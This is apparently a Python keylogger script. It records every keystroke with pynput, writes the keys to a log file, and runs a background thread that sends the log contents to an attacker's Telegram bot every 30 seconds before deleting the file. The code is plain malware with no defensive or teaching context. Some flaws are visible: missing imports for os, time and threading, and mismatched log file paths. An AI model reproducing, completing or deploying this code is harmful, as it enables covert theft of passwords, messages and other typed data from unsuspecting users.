from pynput import keyboard
import requests


telegram_bot_token = "REPLACE_YOUR_TOKEN"
chatID = "your_chat_id_here"


LOG_FILE = "path_File"


def OnPress(key) : # Define the function for handling key presses
    
# write the pressed key to a log file
    with open("Key_log.txt", 'a') as f :
        try : 
            f.write(key.char)
        except AttributeError: 
            f.write(f'[{key}]') # for special keys (shift, ctrl...)

def sendingkeys(message):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    payload = {"chat_id": chatID, "text": message}

    try:
        r = requests.post(url, data=payload)
        print("Status:", r.status_code)
        print("Response:", r.text)
    except Exception as e:
        print("Something went wrong:", e)



def report_logs():
    while True:
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    log_contents = f.read()

                if log_contents:                 # send only if not empty
                    sendingkeys(log_contents)
                    os.remove(LOG_FILE)          # delete file only after sending

        except Exception as e:
            print("Error:", e)

        time.sleep(30)  # wait 30s 

# start background thread
t = threading.Thread(target=report_logs)
t.daemon = True    # thread closes when main program closes
t.start()
            
    
# Create the keyboard listener with `on_press` handler       
with keyboard.Listener (
    on_press = OnPress) as listener :
    listener.join()








